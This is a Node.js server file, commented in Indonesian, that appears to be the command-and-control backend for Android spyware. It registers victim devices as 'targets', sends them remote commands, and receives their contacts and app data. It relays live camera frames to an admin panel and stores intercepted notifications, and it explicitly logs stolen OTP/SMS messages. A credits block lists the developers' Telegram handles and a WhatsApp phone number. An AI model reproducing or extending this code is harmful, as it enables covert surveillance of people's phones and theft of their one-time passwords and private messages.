const express = require('express');
const multer = require('multer');
const cors = require('cors');
const helmet = require('helmet');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');

const authRoutes = require('./routes/auth');
const userRoutes = require('./routes/user');
const whatsappRoutes = require('./routes/whatsapp');
const vpsRoutes = require('./routes/vps');
const toolsRoutes = require('./routes/tools');
const chatRoutes = require('./routes/chat');

const authMiddleware = require('./middleware/authMiddleware');
const rateLimitMiddleware = require('./middleware/rateLimitMiddleware');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 // Support frame kamera & file hingga 100MB
});

app.use(helmet());
app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.json({ limit: '500mb' }));
app.use(rateLimitMiddleware);

// ==========================================================
// [+] STATS UNTUK ONLINE USERS & ACTIVE CONNECTIONS
// ==========================================================
let onlineUsersCount = 0;
let activeSessionsCount = 0;
const activeTargets = new Map(); // { socketId: { id, type, lastHeartbeat } }

// Cleanup koneksi mati setiap 30 detik
setInterval(() => {
    const now = Date.now();
    let changed = false;
    
    for (const [socketId, data] of activeTargets.entries()) {
        if (now - data.lastHeartbeat > 60000) { // 60 detik timeout
            activeTargets.delete(socketId);
            changed = true;
        }
    }
    
    if (changed) {
        onlineUsersCount = Array.from(activeTargets.values()).filter(t => t.type !== 'admin').length;
        activeSessionsCount = activeTargets.size;
        console.log(`[STATS] Online: ${onlineUsersCount}, Total: ${activeSessionsCount}`);
        
        io.to('ADMIN_ROOM').emit('stats_update', {
            onlineUsers: onlineUsersCount,
            activeConnections: activeSessionsCount
        });
    }
}, 30000);

// ==========================================================
// [+] REAL-TIME ENGINE (ADMIN & TARGET MANAGEMENT)
// ==========================================================
io.on('connection', (socket) => {
    const { id, type } = socket.handshake.query;
    
    // Track connection
    activeTargets.set(socket.id, {
        id: id || 'unknown',
        type: type || 'target',
        lastHeartbeat: Date.now()
    });
    
    if (id) {
        socket.join(id);
        if (type === 'admin') {
            socket.join('ADMIN_ROOM'); // Admin masuk ke room khusus broadcast
            console.log(`[+] Admin Linked: ${id}`);
        } else {
            console.log(`[+] Target Linked: ${id}`);
            
            // Update stats
            onlineUsersCount = Array.from(activeTargets.values()).filter(t => t.type !== 'admin').length;
            activeSessionsCount = activeTargets.size;
            
            // Beritahu admin bahwa ada target baru online
            io.to('ADMIN_ROOM').emit('target_status', { id, status: 'online' });
            io.to('ADMIN_ROOM').emit('stats_update', {
                onlineUsers: onlineUsersCount,
                activeConnections: activeSessionsCount
            });
        }
    }
    
    // Heartbeat ack dari client untuk update lastActive
    socket.on('heartbeat_ack', () => {
        if (activeTargets.has(socket.id)) {
            activeTargets.get(socket.id).lastHeartbeat = Date.now();
        }
    });
    
    socket.on('disconnect', () => {
        const conn = activeTargets.get(socket.id);
        activeTargets.delete(socket.id);
        
        // Update stats
        onlineUsersCount = Array.from(activeTargets.values()).filter(t => t.type !== 'admin').length;
        activeSessionsCount = activeTargets.size;
        
        if (conn && conn.id) {
            console.log(`[-] Connection Lost: ${conn.id}`);
            io.to('ADMIN_ROOM').emit('target_status', { id: conn.id, status: 'offline' });
            io.to('ADMIN_ROOM').emit('stats_update', {
                onlineUsers: onlineUsersCount,
                activeConnections: activeSessionsCount
            });
        } else {
            console.log(`[-] Connection Lost: ${socket.id}`);
        }
    });
});

const DB_DIR = './data';
if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR);

const FILES = {
    TARGETS: path.join(DB_DIR, 'targets.json'),
    NOTIFS: path.join(DB_DIR, 'notifications.json'),
    COMMANDS: path.join(DB_DIR, 'commands.json'),
    RESPONSES: path.join(DB_DIR, 'responses.json')
};

const readDB = (file) => {
    if (!fs.existsSync(file)) return [];
    try { return JSON.parse(fs.readFileSync(file, 'utf8') || '[]'); } catch (e) { return []; }
};

const saveDB = (file, data) => {
    try { fs.writeFileSync(file, JSON.stringify(data, null, 2)); } catch (e) { console.log(`[!] DB Write Error`); }
};

const roleHierarchy = [
  "member",
  "reseller",
  "partner",
  "moderator",
  "owner",
  "tk",
  "founder"
];

// ================= AUTO CREATE DB =================
const DB_FILE = './messages.json';

function initDB() {
  if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(
      DB_FILE,
      JSON.stringify({ messages: [] }, null, 2)
    );
    console.log("📁 messages.json created automatically");
  }
}

initDB();

// ================= READ / WRITE =================
function readMessages() {
  try {
    return JSON.parse(fs.readFileSync(DB_FILE, 'utf-8'));
  } catch (e) {
    return { messages: [] };
  }
}

function writeMessages(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

function getNextId() {
  return Date.now();
}

// ================= IMAGE UPLOAD =================
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = './uploads/images';
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + '-' + file.originalname);
  }
});

const upload = multer({ storage });

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/user', authMiddleware, userRoutes);
app.use('/api/whatsapp', authMiddleware, whatsappRoutes);
app.use('/api/vps', authMiddleware, vpsRoutes);
app.use('/api/tools', authMiddleware, toolsRoutes);
app.use('/', chatRoutes);

//PUBLIC BOS
// ================= SEND TEXT =================
app.post('/chat/send', (req, res) => {
  const data = readMessages();

  const newMessage = {
    id: `msg_${getNextId()}`,
    userId: req.body.userId,
    username: req.body.username,
    role: (req.body.role || "member").toLowerCase().trim(),
    message: req.body.message || null,
    imageUrl: null,
    timestamp: new Date().toISOString(),
    avatarUrl: "assets/logo.jpg",
    isDeleted: false
  };

  data.messages.push(newMessage);
  writeMessages(data);

  res.json({ success: true, message: newMessage });
});

// ================= SEND IMAGE =================
app.post('/chat/upload-image', upload.single('image'), (req, res) => {
  const data = readMessages();

  const imageUrl =
    `${req.protocol}://${req.get('host')}/uploads/images/${req.file.filename}`;

  const newMessage = {
    id: `msg_${getNextId()}`,
    userId: req.body.userId,
    username: req.body.username,
    role: (req.body.role || "member").toLowerCase().trim(),
    message: null,
    imageUrl,
    timestamp: new Date().toISOString(),
    avatarUrl: "assets/logo.jpg",
    isDeleted: false
  };

  data.messages.push(newMessage);
  writeMessages(data);

  res.json({ success: true, message: newMessage });
});

// ================= GET MESSAGES =================
app.get('/chat/messages', (req, res) => {
  const data = readMessages();
  const filtered = data.messages.filter(m => !m.isDeleted);
  res.json(filtered.reverse());
});

// ================= DELETE MESSAGE =================
app.delete('/chat/delete/:id', (req, res) => {
  const data = readMessages();

  const msg = data.messages.find(m => m.id === req.params.id);
  if (!msg) return res.json({ success: false });

  msg.isDeleted = true;
  writeMessages(data);

  res.json({ success: true });
});

// Register Target
app.post('/api/register-target', (req, res) => {
    const deviceData = req.body; 
    let targets = readDB(FILES.TARGETS);
    const index = targets.findIndex(t => t.id === deviceData.id);
    const entry = { ...deviceData, lastSeen: new Date(), status: 'Online' };
    
    if (index !== -1) {
        targets[index] = { ...targets[index], ...entry };
    } else {
        targets.push(entry);
    }
    
    saveDB(FILES.TARGETS, targets);
    io.to('ADMIN_ROOM').emit('device_info', entry); // Sync ke panel admin
    res.json({ status: 'ok' });
});

// Kirim Perintah
app.post('/api/send-command', (req, res) => {
    const { deviceId, id, command, extra } = req.body;
    const targetId = deviceId || id; 

    // Real-time trigger via Socket.IO
    io.to(targetId).emit('new_command', { command, extra });

    // Backup via Polling (DB)
    let commands = readDB(FILES.COMMANDS).filter(c => c.targetId !== targetId);
    commands.push({ targetId, command, extra, timestamp: new Date() });
    saveDB(FILES.COMMANDS, commands);
    
    console.log(`[CMD] ${command} sent to ${targetId}`);
    res.json({ status: 'sent', targetId });
});

// FIXED: Post Response (Ditambahkan Logic Live Camera Frame Bridge)
app.post('/api/post-response/:id', (req, res) => {
    const targetId = req.params.id;
    const responsePayload = req.body; // { cmd, data }

    // 1. LIVE CAMERA BRIDGE: Jika ini adalah frame kamera, jangan simpan ke file (bikin penuh)
    // Langsung arahkan ke Admin Panel via Socket menggunakan event 'live_frame'
    if (responsePayload.cmd === "live_camera_frame") {
        io.to('ADMIN_ROOM').emit('live_frame', {
            id: targetId,
            image: responsePayload.data // Base64 data dari native
        });
        return res.json({ status: 'streaming' });
    }
    
    // 2. Broadcast data lain (kontak/apps) secara real-time ke Admin Panel
    io.to('ADMIN_ROOM').emit('new_response', {
        deviceId: targetId,
        cmd: responsePayload.cmd,
        data: responsePayload.data
    });

    // 3. Persistent Storage (Agar DataViewer Page bisa narik data permanen)
    let responses = readDB(FILES.RESPONSES);
    responses = responses.filter(r => !(r.targetId === targetId && r.cmd === responsePayload.cmd));
    responses.push({ targetId, ...responsePayload, timestamp: new Date() });
    saveDB(FILES.RESPONSES, responses);

    res.json({ status: 'broadcasted' });
});

// FIXED: Post Notification (Smart Parser agar tidak "Unknown")
app.post('/api/post-notification/:id', (req, res) => {
    const targetId = req.params.id;
    const data = req.body;

    // Logika filter "OTP/SMS" dari tools lama Bos
    if(data.category === "OTP/SMS") {
        console.log(`[intercept] SMS CURIAN: ${data.title} -> ${data.body || data.text}`);
    }

    // Gabungkan data client dengan fallback cerdas agar tidak muncul "Unknown"
    const entry = {
        targetId,
        app: data.app || "SYSTEM",
        title: data.title || data.sender || "Unknown",
        body: data.body || data.text || data.message || "No content",
        package: data.package || "com.android.system",
        category: data.category || "NOTIFICATION",
        timestamp: data.timestamp || new Date().toISOString()
    };

    // Broadcast Real-time ke UI Admin via Socket
    io.to('ADMIN_ROOM').emit('new_notification', entry);

    // Simpan ke database (Simpan 1000 log terakhir)
    let allNotifs = readDB(FILES.NOTIFS);
    allNotifs.unshift(entry);
    saveDB(FILES.NOTIFS, allNotifs.slice(0, 1000)); 
    
    console.log(`[INTEL] ${entry.app} intercept from ${targetId}: ${entry.title}`);
    res.json({ status: 'saved' });
});

// Heartbeat & Status
app.post('/api/heartbeat/:id', (req, res) => {
    const targetId = req.params.id;
    const { battery } = req.body;
    let targets = readDB(FILES.TARGETS);
    const index = targets.findIndex(t => t.id === targetId);
    
    if (index !== -1) {
        targets[index].lastSeen = new Date();
        targets[index].battery = battery;
        targets[index].status = "Online"; 
        saveDB(FILES.TARGETS, targets);
    }
    
    // Update lastHeartbeat di activeTargets
    for (const [socketId, data] of activeTargets.entries()) {
        if (data.id === targetId || data.id === targetId.toString()) {
            data.lastHeartbeat = Date.now();
            break;
        }
    }
    
    // Beritahu Admin Panel status baterai terbaru
    io.to('ADMIN_ROOM').emit('heartbeat', { deviceId: targetId, battery });
    
    // Kirim stats update juga
    io.to('ADMIN_ROOM').emit('stats_update', {
        onlineUsers: onlineUsersCount,
        activeConnections: activeSessionsCount
    });
    
    res.json({ status: 'alive', onlineUsers: onlineUsersCount });
});

// FIXED: Get Response (Sinkronisasi Data Gabungan untuk UI Admin)
app.get('/api/get-response/:id', (req, res) => {
    const responses = readDB(FILES.RESPONSES);
    const notifs = readDB(FILES.NOTIFS);
    
    const targetResponses = responses.filter(r => r.targetId === req.params.id);
    const targetNotifs = notifs.filter(n => n.targetId === req.params.id);
    
    const formattedData = {};
    targetResponses.forEach(r => {
        formattedData[r.cmd.replace('get_', '')] = r.data;
    });

    // Masukkan notifikasi ke dalam response agar tampil di list SMS/Notif UI Flutter
    formattedData['notifications'] = targetNotifs;

    res.json({ data: formattedData });
});

app.get('/api/list-targets', (req, res) => {
    const operatorName = req.query.username; 
    const targets = readDB(FILES.TARGETS);
    res.json(operatorName ? targets.filter(t => t.admin === operatorName) : targets);
});

// ==========================================================
// [+] ENDPOINT STATS UNTUK FLUTTER (ONLINE USERS)
// ==========================================================
app.get('/api/stats', (req, res) => {
  const targets = readDB(FILES.TARGETS);
  const now = Date.now();

  const onlineTargets = targets.filter(t => {
    if (!t.lastSeen) return false;
    const lastSeen = new Date(t.lastSeen).getTime();
    return now - lastSeen < 60000;
  });

  res.json({
    success: true,
    onlineUsers: onlineTargets.length,
    activeConnections: onlineTargets.length,
    totalTargets: targets.length,
    timestamp: new Date().toISOString()
  });
});

// ==========================================================
// [+] ENDPOINT HISTORY STATS (Opsional)
// ==========================================================
let statsHistory = [];
setInterval(() => {
    statsHistory.push({
        onlineUsers: onlineUsersCount,
        activeConnections: activeSessionsCount,
        timestamp: new Date().toISOString()
    });
    if (statsHistory.length > 100) statsHistory.shift();
}, 60000);

app.get('/api/stats/history', (req, res) => {
    res.json({
        success: true,
        history: statsHistory
    });
});

const tqto = [
  {
    name: "Edgar",
    status: "Developer",
    ppUrl: "https://files.catbox.moe/q5y9ep.jpg",
    contac: "t.me/chicaatractiva"
  },
  {
    name: "Queen",
    status: "Support",
    ppUrl: "https://files.catbox.moe/8a398y.jpg",
    contac: "t.me/hiqueenimupp"
  },
  {
    name: "Zenn",
    status: "Support",
    ppUrl: "https://files.catbox.moe/ouyt8s.jpg",
    contac: "t.me/aboutzennx"
  },
  {
    name: "Arjun Excanor",
    status: "Tangan Kanan apk",
    ppUrl: "https://files.catbox.moe/l1m2q1.jpg",
    contac: "wa.me/6285750854378"
  },
  {
    name: "—𝚉𝙸𝚈𝚈` 𝐓𝟓",
    status: "Owner apk",
    ppUrl: "https://files.catbox.moe/8lkogw.jpg",
    contac: "t.me/ziyystr"
  },
  {
    name: "Lanz",
    status: "Mod apk",
    ppUrl: "https://files.catbox.moe/h83dl2.jpg",
    contac: "t.me/Lanzoffc2"
  },
  {
    name: "Kaiser",
    status: "Mod apk",
    ppUrl: "https://files.catbox.moe/1ot9q0.jpg",
    contac: "t.me/kaiseroffc"
  },  
];

app.get('/tq', (req, res) => {
  res.json({
    status: true,
    result: tqto
  });
});

// Tambahkan endpoint ini di server.js kamu
app.get('/api/berita', async (req, res) => {
  try {
    const { data } = await axios.get('https://kemkes.go.id/id/category/rilis-berita', {
      headers: { "User-Agent": "Mozilla/5.0" }
    });
    const $ = cheerio.load(data);
    let results = [];
    $(".row > div").each((i, el) => {
      const a = $(el).find("a").first();
      const title = a.text().trim();
      const link = a.attr("href");
      if (title && link && title.length > 20) {
        results.push({ title: title, link: link.startsWith("http") ? link : "https://kemkes.go.id" + link });
      }
    });
    res.json({ success: true, data: results.slice(0, 10) });
  } catch (err) {
    res.json({ success: false, data: [] });
  }
});

app.get('/ping', (req, res) => res.send('pong'));

module.exports = server;